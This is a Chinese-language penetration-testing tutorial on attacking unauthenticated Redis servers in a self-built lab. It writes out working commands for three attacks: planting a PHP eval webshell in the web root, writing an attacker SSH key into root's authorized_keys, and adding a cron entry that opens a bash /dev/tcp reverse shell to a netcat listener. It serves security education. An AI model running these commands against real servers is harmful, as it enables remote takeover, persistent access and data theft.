@@ -1,0 +1,389 @@
+## 系列文章
+
+> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)
+
+## 简介
+
+ **渗透测试-地基篇**
+
+该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。
+
+ **请注意** ：
+
+> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
+> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。
+
+名言：
+
+你对这行的兴趣，决定你在这行的成就！
+
+## 一、前言
+
+数据库作为业务平台信息技术的核心和基础，承载着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，数据库的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的数据库中往往储存着等极其重要和敏感的信息。这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。
+
+通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！
+
+今天会讲解到Redis环境安装、Redis未授权访问、redis写webshell、redis
+密钥登录ssh、利用计划任务反弹shell等操作，如果连Redis都不会安装操作提权等，怎么进行下一步的研究Redis数据库安全！怎么拿下对方服务器？
+
+## 二、Redis简介
+
+REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。
+
+Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Map),
+列表(list), 集合(sets) 和有序集合(sorted
+sets)等类型。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。目前最新稳定版本为4.0.8。
+
+Redis 是一个开源的高性能键值数据库。最热门的 NoSql 数据库之一，也被人们称为数据结构服务器。
+
+它最突出的特点就是： **快**
+
+    
+    
+    1. 以内存作为数据存储介质，读写数据的效率极高。
+    2. 跟 memcache 不同的是，储存在 Redis 中的数据是持久化的，断电或重启，数据也不会丢失。
+    3. 存储分为内存存储、磁盘存储和 log 文件。
+    4. 可以从磁盘重新将数据加载到内存中，也可以通过配置文件对其进行配置，因此，redis 才能实现持久化。
+    5. 支持主从模式，可以配置集群，更利于支撑大型的项目。
+    
+
+### 1、Redis默认端口
+
+Redis默认配置端口为6379，sentinel.conf配置器端口为26379
+
+### 2、官方站点
+
+https://redis.io/
+
+http://download.redis.io/releases/redis-3.2.11.tar.gz
+
+4.x安装：
+
+    
+    
+    wget http://download.redis.io/releases/redis-4.0.8.tar.gz
+    tar -zxvf redis-4.0.8.tar.gz
+    cd redis-4.0.8
+    make
+    
+
+最新版本前期漏洞已经修复，测试时建议安装3.2.11版本。
+
+以下实验使用3.2版本复现！！
+
+## 三、Redis环境安装
+
+### 1、 定义
+
+Redis是一个C语言编写的基于key-value类型的高效数据库。
+
+Redis可以执行一些操作将数据保存到内存之中（这也是为什么效率这么高的原因）。
+
+同时redis也可以将内存中的数据写入磁盘之中。
+
+### 2、 未授权访问原因
+
+主要是因为配置不当，导致未授权访问漏洞。
+
+进一步将恶意数据写入内存或者磁盘之中，造成更大的危害。
+
+配置不当一般主要是两个原理：
+
+    
+    
+    （1）配置登录策略导致任意机器都可以登录redis。
+    
+    （2）未设置密码或者设置弱口令。
+    
+
+### 3、 redis服务的搭建
+
+    
+    
+    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
+    tar xzf redis-3.2.0.tar.gz
+    cd redis-3.2.0
+    make
+    
+
+![1626491978_60f24c4a93f137197f3a8.png!small?1626491980696](https://image.3001.net/images/20210717/1626491978_60f24c4a93f137197f3a8.png!small?1626491980696)![1626491982_60f24c4e78cdbc1b7c270.png!small?1626491986567](https://image.3001.net/images/20210717/1626491982_60f24c4e78cdbc1b7c270.png!small?1626491986567)
+
+下载redis的压缩包文件，解压缩，切换目录到解压后的redis，进行编译。
+
+### 4、修改配置文件redis.conf
+
+    
+    
+    （1）cp redis.conf ./src/redis.conf
+    （2）bind 127.0.0.1前面加上#号注释掉
+    注释这行语句，代表任意机器都可以登录redis
+    （3）protected-mode设为no
+    这只为NO，代表关闭安全设置
+    （4）启动redis-server
+    ./src/redis-server redis.conf
+    
+
+![1626491992_60f24c5878c17ae729467.png!small?1626491996592](https://image.3001.net/images/20210717/1626491992_60f24c5878c17ae729467.png!small?1626491996592)安装成功后，如图所示。默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。
+
+### 5、zsh需要添加环境变量：
+
+    
+    
+    export PATH=/root/Desktop/redis-3.2.0/src:$PATH
+    
+
+![1626491998_60f24c5e516f6828f8c4e.png!small?1626491999017](https://image.3001.net/images/20210717/1626491998_60f24c5e516f6828f8c4e.png!small?1626491999017)
+
+![1626492001_60f24c61919225493c12f.png!small?1626492001735](https://image.3001.net/images/20210717/1626492001_60f24c61919225493c12f.png!small?1626492001735)
+
+### 6、检查服务
+
+![1626492005_60f24c65868d9c576a0c0.png!small?1626492006971](https://image.3001.net/images/20210717/1626492005_60f24c65868d9c576a0c0.png!small?1626492006971)
+
+已开启6379！
+
+## 四、Redis未授权访问
+
+Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（http://www.sohu.com/a/143409075_765820），如果公司使用了Redis，那么应当给予重视，通过实际研究，当在一定条件下，攻击者可以获取webshell，甚至root权限。
+
+### 1、连接Redis服务器
+
+（1）交互式方式
+
+    
+    
+    redis-cli -h {host} -p {port}
+    
+
+方式连接，然后所有的操作都是在交互的方式实现，不需要再执行redis-cli了，例如命令：redis-cli -h 127.0.0.1-p
+6379，加-a参数表示带密码的访问。
+
+（2）命令方式
+
+    
+    
+    redis-cli -h {host} -p {port} {command}
+    
+
+直接得到命令的返回结果
+
+（3）常见命令
+
+    
+    
+    1. 查看信息：info
+    2. 删除所有数据库内容：flushall
+    3. 刷新数据库：flushdb
+    4. 看所有键：KEYS *，使用select num可以查看键值数据。
+    5. 设置变量：set test “who am i”
+    6. config set dir dirpath 设置路径等配置
+    7. config get dir/dbfilename 获取路径及数据配置信息
+    8. save保存
+    9. get 变量，查看变量名称
+    
+
+更多命令可以参考文章：https://www.cnblogs.com/kongzhongqijing/p/6867960.html
+
+### 2、使用攻击机器测试是否存在未授权
+
+    
+    
+    redis-cli -h 192.168.253.9
+    info
+    
+
+![1626492014_60f24c6ece92e221c70b7.png!small?1626492017643](https://image.3001.net/images/20210717/1626492014_60f24c6ece92e221c70b7.png!small?1626492017643)
+
+### 3、不存在未授权情况
+
+    
+    
+    1. bind 127.0.0.1 未注释，仅仅允许本地访问，攻击机kali无法连接。
+    2. 设置了密码（爆破redis的密码（hydra））
+    
+
+## 五、redis写webshell
+
+### 1、写入webshell
+
+ **命令：**
+
+    
+    
+    config set dir /var/www/html/
+    //切换目录到网站的根目录
+    
+    set x "\n\n\n<?php phpinfo();?>\n\n\n"
+    //写入恶意代码到内存中(1)
+    
+    set xx "\n\n\n<?php @eval($_POST[‘dayu’]);?>\n\n\n"
+    //写入恶意代码到内存中(2)
+    
+    config set dbfilename shell.php
+    //在磁盘中生成木马文件
+    
+    save
+    //将内存之中的数据导出到磁盘文件
+    
+    
+
+**强调：执行命令顺序可以打乱！**
+
+![1626492022_60f24c76bbb26c248bad5.png!small?1626492024375](https://image.3001.net/images/20210717/1626492022_60f24c76bbb26c248bad5.png!small?1626492024375)![1626492026_60f24c7ad90315322efd2.png!small?1626492027937](https://image.3001.net/images/20210717/1626492026_60f24c7ad90315322efd2.png!small?1626492027937)
+成功通过未授权写入webshel
+
+### 2、检查webshell
+
+1）kali开启apache  
+在终端输入“vim /etc/apache2/ports.conf” -> 键盘输入i 进入插入编辑模式 -> 修改apache2默认监听端口号为8080
+-> 编辑好后，按Esc键+“：wq” 保存退出 -> 在终端输入“/etc/init.d/apache2 start”
+
+2）测试  
+![1626492032_60f24c80a98c6c5dc3979.png!small?1626492038511](https://image.3001.net/images/20210717/1626492032_60f24c80a98c6c5dc3979.png!small?1626492038511)
+
+    
+    
+    http://192.168.253.9:8080/shell.php
+    
+
+![1626492036_60f24c849b47a006acfe1.png!small?1626492038511](https://image.3001.net/images/20210717/1626492036_60f24c849b47a006acfe1.png!small?1626492038511)正常蚁剑链接webshell!!
+
+## 六、redis 密钥登录ssh
+
+### 1、kali开启ssh服务
+
+![1626492042_60f24c8a068e2a6ec51ae.png!small?1626492044234](https://image.3001.net/images/20210717/1626492042_60f24c8a068e2a6ec51ae.png!small?1626492044234)
+
+    
+    
+    /etc/init.d/ssh start
+    
+
+### 2、修改redis密码
+
+![1626492046_60f24c8e08a582b7e7177.png!small?1626492046439](https://image.3001.net/images/20210717/1626492046_60f24c8e08a582b7e7177.png!small?1626492046439)
+
+    
+    
+    config set requirepass dayu123
+    
+    登录：
+    redis-cli -h 192.168.253.9 -a dayu123
+    
+
+### 3、生成ssh-rsa密匙
+
+![1626492051_60f24c93318bf8d978768.png!small?1626492052753](https://image.3001.net/images/20210717/1626492051_60f24c93318bf8d978768.png!small?1626492052753)
+
+    
+    
+    ssh-keygen -t rsa
+    
+
+### 4、写入ssh密匙
+
+1）导出key（\n\n是为了防止乱码）。
+
+    
+    
+    (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+    
+
+![1626492057_60f24c99910fb595bd1a7.png!small?1626492065451](https://image.3001.net/images/20210717/1626492057_60f24c99910fb595bd1a7.png!small?1626492065451)
+
+2）将生成的公钥写入redis服务器的内存之中
+
+    
+    
+    cat key.txt | redis-cli -h 192.168.253.9 -a dayu123 -x set xxx	
+    
+
+![1626492061_60f24c9da0adc3802e134.png!small?1626492068702](https://image.3001.net/images/20210717/1626492061_60f24c9da0adc3802e134.png!small?1626492068702)![1626492065_60f24ca1b1260637e987c.png!small?1626492068702](https://image.3001.net/images/20210717/1626492065_60f24ca1b1260637e987c.png!small?1626492068702)成功写入！！
+
+3）设置路径，准备导出文件到磁盘.（本质是更改redis的备份路径）
+
+![1626492069_60f24ca58ac921eee619a.png!small?1626492071381](https://image.3001.net/images/20210717/1626492069_60f24ca58ac921eee619a.png!small?1626492071381)
+
+    
+    
+    config set dir /root/.ssh
+    
+
+注意：假如这个“ /root/.ssh ”不存在的话，这里会显示失败的，就不会返回ok了。
+
+4）设置文件名（不能改成其他的）并导出
+
+![1626492073_60f24ca91a605372d6597.png!small?1626492073444](https://image.3001.net/images/20210717/1626492073_60f24ca91a605372d6597.png!small?1626492073444)
+
+    
+    
+    config set dbfilename authorized_keys
+    save
+    
+
+![1626492076_60f24cac9a14937cf806c.png!small](https://image.3001.net/images/20210717/1626492076_60f24cac9a14937cf806c.png!small)成功导入！！！
+
+5）登录ssh  
+![1626567810_60f3748207a090bd75e62.png!small?1626567816418](https://image.3001.net/images/20210718/1626567810_60f3748207a090bd75e62.png!small?1626567816418)成功登录！！
+
+## 七、利用计划任务反弹shell
+
+### 1、攻击端开启监听
+
+![1626567815_60f37487095e5b362bf5c.png!small?1626567816419](https://image.3001.net/images/20210718/1626567815_60f37487095e5b362bf5c.png!small?1626567816419)
+
+    
+    
+    nc -vlp 6666
+    
+
+### 2、写入一句话
+
+    
+    
+    set xx "\n* * * * * bash -i >& /dev/tcp/192.168.253.9/6666 0>&1\n"
+    //上边的星号代表的是计划任务的时间
+    
+    config set dir /var/spool/cron/
+    //设置导出的路径
+    
+    config set dbfilename root
+    //设置导出文件名为“ root ”
+    
+    save
+    //保存
+    
+
+或者：
+
+    
+    
+    echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.253.9/6666 0>&1\n\n"|redis-cli -h 192.168.253.12 -x set 1
+    
+    redis-cli -h 192.168.253.12 config set dir /var/spool/cron/
+    redis-cli -h 192.168.253.12 config set dbfilename root
+    redis-cli -h 192.168.253.12 save
+    
+
+经过测试，centos成功！  
+![1626567822_60f3748eb2849721c1a6f.png!small?1626567823492](https://image.3001.net/images/20210718/1626567822_60f3748eb2849721c1a6f.png!small?1626567823492)![1626567827_60f37493ef35fd8e5850a.png!small?1626567831299](https://image.3001.net/images/20210718/1626567827_60f37493ef35fd8e5850a.png!small?1626567831299)
+
+## 八、总结
+
+今天学到了Redis环境安装、Redis未授权访问、redis写webshell、redis
+密钥登录ssh、利用计划任务反弹shell等操作渗透的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！
+
+    
+    
+    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）......
+    
+
+接下来在《服务攻防之数据库Redis（下）》会接触到如何进行利用主从复制RCE、本地Redis主从复制RCE反弹shell、SSRF Redis
+反弹shell、Redis知识拓展、Redis安全防护等操作，如何提权渗透等方法，请看下篇服务攻防之数据库Redis下篇章！
+
+希望大家提高安全意识，没有网络安全就没有国家安全！
+
+今天基础牢固就到这里，虽然基础，但是必须牢记于心。
+
+作者：大余
+
